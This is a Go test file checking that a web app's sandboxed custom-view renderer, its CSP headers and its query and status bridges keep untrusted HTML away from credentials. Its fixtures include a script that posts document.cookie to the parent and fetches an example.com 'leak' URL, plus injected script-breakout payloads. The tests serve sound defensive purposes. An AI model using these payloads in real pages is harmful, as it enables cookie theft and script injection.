package stuff

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

const hostileRenderer = `<!doctype html><html><body><h1>Custom</h1><script>parent.postMessage(document.cookie,"*");fetch("https://example.com/leak")</script></body></html>`

func putViewUIFixture(t *testing.T, store *memoryStore, itemID, viewID string, metadata any) {
	t.Helper()
	if _, err := store.Create(t.Context(), viewID, Document{
		"stuff_kind": "view", "name": "Custom dashboard", "renderer": hostileRenderer,
		"capabilities": []any{"find_items", "find_notes"},
		"created_at":   "2026-08-27T01:00:00Z", "updated_at": "2026-08-27T01:00:00Z",
	}); err != nil {
		t.Fatal(err)
	}
	if _, err := store.Create(t.Context(), itemID, Document{
		"stuff_kind": "item", "name": "Rendered Item", "view_id": viewID, "metadata": metadata,
		"created_at": "2026-08-27T01:00:00Z", "updated_at": "2026-08-27T01:00:00Z",
	}); err != nil {
		t.Fatal(err)
	}
}

func TestReadItemWithoutViewAndPlainEscapeRemainGeneric(t *testing.T) {
	store := newMemoryStore()
	putReadFixture(t, store, "item_plain", "item", "Plain Item", "", "2026-08-27T01:00:00Z", "2026-08-27T01:00:00Z", "")
	putViewUIFixture(t, store, "item_custom", "view_custom", Document{"message": "ordinary"})
	h := NewServer(store, "secret-token", nil).Handler()

	plainItem := htmlRequest(h, http.MethodGet, "/read/items/item_plain")
	if plainItem.Code != http.StatusOK || !strings.Contains(plainItem.Body.String(), "<h2>Metadata</h2>") || strings.Contains(plainItem.Body.String(), "<iframe") {
		t.Fatalf("no-view Item changed: %d %s", plainItem.Code, plainItem.Body.String())
	}

	escape := htmlRequest(h, http.MethodGet, "/read/items/item_custom?plain=1")
	if escape.Code != http.StatusOK || !strings.Contains(escape.Body.String(), "<h2>Metadata</h2>") || strings.Contains(escape.Body.String(), "<iframe") || strings.Contains(escape.Body.String(), hostileRenderer) {
		t.Fatalf("plain escape executed or hid generic detail: %d %s", escape.Code, escape.Body.String())
	}
}

func TestReadViewHostIsFirstPartyShellNotRendererInterpolation(t *testing.T) {
	store := newMemoryStore()
	putViewUIFixture(t, store, "item_custom", "view_custom", Document{"payload": `</script><script>alert("host")</script>`})
	h := NewServer(store, "secret-token", nil).Handler()

	host := htmlRequest(h, http.MethodGet, "/read/items/item_custom")
	body := host.Body.String()
	if host.Code != http.StatusOK || !strings.Contains(body, `sandbox="allow-scripts allow-top-navigation-by-user-activation"`) || strings.Contains(body, "allow-same-origin") {
		t.Fatalf("host iframe sandbox: %d %s", host.Code, body)
	}
	for _, want := range []string{"/read/items/item_custom/view", "/read/items/item_custom/snapshot", "/read/items/item_custom/query/", "/read/items/item_custom/status", "/read/items/item_custom?plain=1", "/read/view-host.js"} {
		if !strings.Contains(body, want) {
			t.Fatalf("host missing %q: %s", want, body)
		}
	}
	if strings.Contains(body, hostileRenderer) || strings.Contains(body, `alert("host")`) || strings.Contains(body, "secret-token") {
		t.Fatalf("untrusted content or credential interpolated into host: %s", body)
	}
	csp := host.Header().Get("Content-Security-Policy")
	for _, want := range []string{"default-src 'none'", "script-src 'self'", "connect-src 'self'", "frame-src 'self'", "base-uri 'none'", "form-action 'none'"} {
		if !strings.Contains(csp, want) {
			t.Fatalf("host CSP missing %q: %s", want, csp)
		}
	}

	script := htmlRequest(h, http.MethodGet, "/read/view-host.js")
	if script.Code != http.StatusOK || !strings.Contains(script.Body.String(), "postMessage") || !strings.Contains(script.Body.String(), "event.source !== frame.contentWindow") || !strings.Contains(script.Body.String(), "active >= 4") || !strings.Contains(script.Body.String(), "credentials: \"same-origin\"") || !strings.Contains(script.Body.String(), "Stuff-View-Bridge") || !strings.Contains(script.Body.String(), "stuff:view-status-result") || strings.Contains(script.Body.String(), "secret-token") {
		t.Fatalf("unsafe or missing host script: %d %s", script.Code, script.Body.String())
	}
}

func TestReadViewDocumentHasHostileSandbox(t *testing.T) {
	store := newMemoryStore()
	putViewUIFixture(t, store, "item_custom", "view_custom", Document{})
	h := NewServer(store, "secret-token", nil).Handler()

	frame := htmlRequest(h, http.MethodGet, "/read/items/item_custom/view")
	if frame.Code != http.StatusOK || frame.Body.String() != hostileRenderer {
		t.Fatalf("renderer was not served verbatim: %d %q", frame.Code, frame.Body.String())
	}
	csp := frame.Header().Get("Content-Security-Policy")
	for _, want := range []string{
		"sandbox allow-scripts", "default-src 'none'", "script-src 'unsafe-inline'", "style-src 'unsafe-inline'",
		"connect-src 'none'", "object-src 'none'", "frame-src 'none'", "worker-src 'none'", "base-uri 'none'", "form-action 'none'", "allow-top-navigation-by-user-activation",
	} {
		if !strings.Contains(csp, want) {
			t.Fatalf("renderer CSP missing %q: %s", want, csp)
		}
	}
	if strings.Contains(csp, "allow-same-origin") || strings.Contains(csp, "sandbox allow-scripts allow-top-navigation;") || strings.Contains(csp, "navigate-to") {
		t.Fatalf("renderer gained ambient origin/navigation authority or retained unsupported CSP: %s", csp)
	}
	if frame.Header().Get("Referrer-Policy") != "no-referrer" || frame.Header().Get("X-Content-Type-Options") != "nosniff" || strings.Contains(frame.Body.String(), "secret-token") {
		t.Fatalf("renderer security headers or credential boundary failed: %#v", frame.Header())
	}
}

func TestReadViewSnapshotIsPublicBoundedDataNotHTML(t *testing.T) {
	store := newMemoryStore()
	malicious := `</script><script>alert("snapshot")</script>`
	putViewUIFixture(t, store, "item_custom", "view_custom", Document{"status": "opaque", "view_id": malicious})
	putReadFixture(t, store, "note_linked", "note", "", "item_custom", "2026-08-27T02:00:00Z", "2026-08-27T02:00:00Z", "linked")
	store.mu.Lock()
	store.docs["note_linked"]["metadata"] = Document{"payload": malicious}
	store.docs["note_linked"]["_attachments"] = map[string]any{"report.txt": map[string]any{"content_type": "text/plain", "length": 12}}
	store.docs["note_linked"]["stuff_attachment_meta"] = map[string]any{"report.txt": map[string]any{"media_type": "text/plain", "bytes": 12}}
	store.attachments["note_linked/report.txt"] = []byte("secret bytes")
	store.mu.Unlock()
	putReadFixture(t, store, "note_other", "note", "", "item_elsewhere", "2026-08-27T03:00:00Z", "2026-08-27T03:00:00Z", "not linked")
	h := NewServer(store, "secret-token", nil).Handler()

	w := htmlRequest(h, http.MethodGet, "/read/items/item_custom/snapshot")
	if w.Code != http.StatusOK || !strings.HasPrefix(w.Header().Get("Content-Type"), "application/json") {
		t.Fatalf("snapshot response: %d %#v %s", w.Code, w.Header(), w.Body.String())
	}
	var message Document
	if err := json.Unmarshal(w.Body.Bytes(), &message); err != nil {
		t.Fatal(err)
	}
	if message["type"] != "stuff:view-snapshot" || message["version"] != float64(1) {
		t.Fatalf("snapshot protocol: %#v", message)
	}
	item, _ := message["item"].(map[string]any)
	if item["id"] != "item_custom" || item["view_id"] != "view_custom" || item["stuff_kind"] != nil || item["_rev"] != nil {
		t.Fatalf("non-public Item envelope: %#v", item)
	}
	notes, _ := message["notes"].([]any)
	if len(notes) != 1 {
		t.Fatalf("snapshot linked Notes: %#v", notes)
	}
	note, _ := notes[0].(map[string]any)
	attachments, _ := note["attachments"].([]any)
	if note["text"] != "linked" || len(attachments) != 1 || strings.Contains(w.Body.String(), "secret bytes") || strings.Contains(w.Body.String(), "secret-token") {
		t.Fatalf("snapshot leaked body/credential or lost Note descriptor: %s", w.Body.String())
	}
	metadata, _ := item["metadata"].(map[string]any)
	if metadata["status"] != "opaque" || metadata["view_id"] != malicious {
		t.Fatalf("metadata was interpreted or changed: %#v", metadata)
	}
}

func TestReadViewQueryBridgeIsReadOnlyBoundedAndCredentialless(t *testing.T) {
	store := newMemoryStore()
	putViewUIFixture(t, store, "item_custom", "view_custom", Document{"status": "opaque"})
	putReadFixture(t, store, "item_other", "item", "Other", "", "2026-08-27T02:00:00Z", "2026-08-27T02:00:00Z", "")
	putReadFixture(t, store, "note_linked", "note", "", "item_other", "2026-08-27T03:00:00Z", "2026-08-27T03:00:00Z", "note")
	h := NewServer(store, "secret-token", nil).Handler()

	store.mu.Lock()
	delete(store.docs["view_custom"], "capabilities")
	store.mu.Unlock()
	code, denied := request(t, h, http.MethodPost, "/read/items/item_custom/query/items", Document{"selector": Document{}, "limit": 20})
	if code != http.StatusForbidden || !strings.Contains(errReason(denied), "not allowed") {
		t.Fatalf("query without explicit capability: %d %#v", code, denied)
	}
	store.mu.Lock()
	store.docs["view_custom"]["capabilities"] = []any{"find_items", "find_notes"}
	store.mu.Unlock()

	code, items := request(t, h, http.MethodPost, "/read/items/item_custom/query/items", Document{"selector": Document{}, "limit": 20})
	if code != http.StatusOK {
		t.Fatalf("credentialless Item query: %d %#v", code, items)
	}
	docs, _ := items["docs"].([]any)
	if len(docs) != 2 || strings.Contains(string(mustJSON(t, items)), "secret-token") {
		t.Fatalf("Item query data or credential boundary: %#v", items)
	}
	for _, raw := range docs {
		doc, _ := raw.(map[string]any)
		if doc["stuff_kind"] != nil || doc["_rev"] != nil {
			t.Fatalf("query leaked internal envelope: %#v", doc)
		}
	}

	code, notes := request(t, h, http.MethodPost, "/read/items/item_custom/query/notes", Document{"selector": Document{}, "limit": 20})
	if code != http.StatusOK {
		t.Fatalf("credentialless Note query: %d %#v", code, notes)
	}
	noteDocs, _ := notes["docs"].([]any)
	if len(noteDocs) != 1 {
		t.Fatalf("Note query result: %#v", notes)
	}

	code, over := request(t, h, http.MethodPost, "/read/items/item_custom/query/items", Document{"selector": Document{}, "limit": MaxPageSize + 1})
	if code != http.StatusBadRequest || !strings.Contains(errReason(over), "limit") {
		t.Fatalf("unbounded query accepted: %d %#v", code, over)
	}
	code, missing := request(t, h, http.MethodPost, "/read/items/item_other/query/items", Document{"selector": Document{}})
	if code != http.StatusNotFound {
		t.Fatalf("non-View Item gained query bridge: %d %#v", code, missing)
	}
}

func bridgeStatusRequest(t *testing.T, h http.Handler, batchID string, body Document) (int, Document) {
	t.Helper()
	encoded, err := json.Marshal(body)
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest(http.MethodPost, "/read/items/"+batchID+"/status", bytes.NewReader(encoded))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Stuff-View-Bridge", "1")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	var out Document
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatalf("invalid bridge response (%d): %s", w.Code, w.Body.String())
	}
	return w.Code, out
}

func TestReadViewStatusBridgeIsExplicitlyScopedAndStatusOnly(t *testing.T) {
	store := newMemoryStore()
	putViewUIFixture(t, store, "item_batch", "view_board", Document{
		"stuff_kanban": Document{"cards": []any{"item_card"}, "lanes": []any{"todo", "doing", "done"}},
	})
	putReadFixture(t, store, "item_card", "item", "Keep this name", "", "2026-08-27T02:00:00Z", "2026-08-27T02:00:00Z", "")
	putReadFixture(t, store, "item_outside", "item", "Outside", "", "2026-08-27T02:00:00Z", "2026-08-27T02:00:00Z", "")
	store.mu.Lock()
	store.docs["item_card"]["metadata"] = Document{"status": "todo", "owner": "preserved"}
	store.docs["item_outside"]["metadata"] = Document{"status": "todo"}
	delete(store.docs["view_board"], "capabilities")
	store.mu.Unlock()
	h := NewServer(store, "api-secret-never-needed-by-the-frame", nil).Handler()

	body := Document{"item_id": "item_card", "status": "doing", "revision": "1-test"}
	code, denied := bridgeStatusRequest(t, h, "item_batch", body)
	if code != http.StatusForbidden || !strings.Contains(errReason(denied), "not allowed") {
		t.Fatalf("mutation without capability: %d %#v", code, denied)
	}
	store.mu.Lock()
	store.docs["view_board"]["capabilities"] = []any{"update_linked_status"}
	store.mu.Unlock()

	code, outside := bridgeStatusRequest(t, h, "item_batch", Document{"item_id": "item_outside", "status": "doing", "revision": "1-test"})
	if code != http.StatusForbidden || !strings.Contains(errReason(outside), "explicitly linked") {
		t.Fatalf("unlinked card mutated: %d %#v", code, outside)
	}
	code, lane := bridgeStatusRequest(t, h, "item_batch", Document{"item_id": "item_card", "status": "deleted", "revision": "1-test"})
	if code != http.StatusForbidden || !strings.Contains(errReason(lane), "allowed lane") {
		t.Fatalf("unlisted lane accepted: %d %#v", code, lane)
	}

	code, extraFields := bridgeStatusRequest(t, h, "item_batch", Document{"item_id": "item_card", "status": "doing", "revision": "1-test", "name": "attacker rename", "metadata": Document{"owner": "lost"}})
	if code != http.StatusBadRequest || !strings.Contains(errReason(extraFields), "only") {
		t.Fatalf("extra mutation fields accepted: %d %#v", code, extraFields)
	}
	code, moved := bridgeStatusRequest(t, h, "item_batch", body)
	item, _ := moved["item"].(map[string]any)
	meta, _ := item["metadata"].(map[string]any)
	if code != http.StatusOK || item["name"] != "Keep this name" || item["revision"] != "2-test" || meta["status"] != "doing" || meta["owner"] != "preserved" {
		t.Fatalf("status-only update did not preserve envelope: %d %#v", code, moved)
	}
	outsideDoc, _ := store.Get(t.Context(), "item_outside")
	outsideMeta, _ := outsideDoc["metadata"].(map[string]any)
	if outsideMeta["status"] != "todo" {
		t.Fatalf("outside card changed: %#v", outsideDoc)
	}
}

func TestReadViewStatusBridgeRequiresHostHeaderAndCurrentRevision(t *testing.T) {
	store := newMemoryStore()
	putViewUIFixture(t, store, "item_batch", "view_board", Document{
		"stuff_kanban": Document{"cards": []any{"item_card"}, "lanes": []any{"todo", "done"}},
	})
	putReadFixture(t, store, "item_card", "item", "Card", "", "2026-08-27T02:00:00Z", "2026-08-27T02:00:00Z", "")
	store.mu.Lock()
	store.docs["view_board"]["capabilities"] = []any{"update_linked_status"}
	store.docs["item_card"]["metadata"] = Document{"status": "todo", "details": "newest"}
	store.mu.Unlock()
	h := NewServer(store, "secret", nil).Handler()

	code, noHeader := request(t, h, http.MethodPost, "/read/items/item_batch/status", Document{"item_id": "item_card", "status": "done", "revision": "1-test"})
	if code != http.StatusForbidden || !strings.Contains(errReason(noHeader), "first-party") {
		t.Fatalf("form-compatible request reached mutation: %d %#v", code, noHeader)
	}
	code, missingRevision := bridgeStatusRequest(t, h, "item_batch", Document{"item_id": "item_card", "status": "done"})
	if code != http.StatusBadRequest || !strings.Contains(errReason(missingRevision), "revision") {
		t.Fatalf("revisionless update accepted: %d %#v", code, missingRevision)
	}

	// Simulate another writer after the renderer's copy was loaded.
	card, _ := store.Get(t.Context(), "item_card")
	card["metadata"].(map[string]any)["details"] = "changed elsewhere"
	if _, err := store.Put(t.Context(), "item_card", "1-test", card); err != nil {
		t.Fatal(err)
	}
	code, conflict := bridgeStatusRequest(t, h, "item_batch", Document{"item_id": "item_card", "status": "done", "revision": "1-test"})
	current, _ := conflict["current"].(map[string]any)
	currentMeta, _ := current["metadata"].(map[string]any)
	if code != http.StatusConflict || current["revision"] != "2-test" || currentMeta["status"] != "todo" || currentMeta["details"] != "changed elsewhere" {
		t.Fatalf("conflict did not return refresh-safe current card: %d %#v", code, conflict)
	}
	stored, _ := store.Get(t.Context(), "item_card")
	storedMeta, _ := stored["metadata"].(map[string]any)
	if storedMeta["status"] != "todo" || stored["_rev"] != "2-test" {
		t.Fatalf("stale move overwrote card: %#v", stored)
	}
}

func TestReadViewStatusBridgeFailsClosedOnMalformedManifestAndKinds(t *testing.T) {
	store := newMemoryStore()
	putViewUIFixture(t, store, "item_batch", "view_board", Document{"stuff_kanban": Document{"cards": []any{"item_card"}, "lanes": []any{3}}})
	putReadFixture(t, store, "item_card", "item", "Card", "", "2026-08-27T02:00:00Z", "2026-08-27T02:00:00Z", "")
	store.mu.Lock()
	store.docs["view_board"]["capabilities"] = []any{"update_linked_status"}
	store.mu.Unlock()
	h := NewServer(store, "", nil).Handler()
	code, malformed := bridgeStatusRequest(t, h, "item_batch", Document{"item_id": "item_card", "status": "done", "revision": "1-test"})
	if code != http.StatusForbidden || !strings.Contains(errReason(malformed), "manifest") {
		t.Fatalf("malformed authority manifest accepted: %d %#v", code, malformed)
	}

	store.mu.Lock()
	store.docs["item_batch"]["metadata"] = Document{"stuff_kanban": Document{"cards": []any{"view_board"}, "lanes": []any{"done"}}}
	store.mu.Unlock()
	code, wrongKind := bridgeStatusRequest(t, h, "item_batch", Document{"item_id": "view_board", "status": "done", "revision": "1-test"})
	if code != http.StatusForbidden || !strings.Contains(errReason(wrongKind), "not an Item") {
		t.Fatalf("linked non-Item mutated: %d %#v", code, wrongKind)
	}
}

func mustJSON(t *testing.T, value any) []byte {
	t.Helper()
	encoded, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	return encoded
}

func TestReadViewDriftFallsBackAndDirectRoutesFailClosed(t *testing.T) {
	store := newMemoryStore()
	putReadFixture(t, store, "item_stale", "item", "Stale", "", "2026-08-27T01:00:00Z", "2026-08-27T01:00:00Z", "")
	store.mu.Lock()
	store.docs["item_stale"]["view_id"] = "view_missing"
	store.mu.Unlock()
	h := NewServer(store, "", nil).Handler()

	fallback := htmlRequest(h, http.MethodGet, "/read/items/item_stale")
	if fallback.Code != http.StatusOK || !strings.Contains(fallback.Body.String(), "referenced View is unavailable") || !strings.Contains(fallback.Body.String(), "<h2>Metadata</h2>") || strings.Contains(fallback.Body.String(), "<iframe") {
		t.Fatalf("stale View did not visibly fall back: %d %s", fallback.Code, fallback.Body.String())
	}
	for _, path := range []string{"/read/items/item_stale/view", "/read/items/item_stale/snapshot"} {
		w := htmlRequest(h, http.MethodGet, path)
		if w.Code != http.StatusNotFound {
			t.Fatalf("stale direct route %s: %d %s", path, w.Code, w.Body.String())
		}
	}

	putReadFixture(t, store, "item_other", "item", "Other", "", "2026-08-27T01:00:00Z", "2026-08-27T01:00:00Z", "")
	store.mu.Lock()
	store.docs["item_stale"]["view_id"] = "item_other"
	store.mu.Unlock()
	wrong := htmlRequest(h, http.MethodGet, "/read/items/item_stale")
	if wrong.Code != http.StatusOK || !strings.Contains(wrong.Body.String(), "referenced View is invalid") || strings.Contains(wrong.Body.String(), "<iframe") {
		t.Fatalf("wrong-kind View did not fail safely: %d %s", wrong.Code, wrong.Body.String())
	}
}
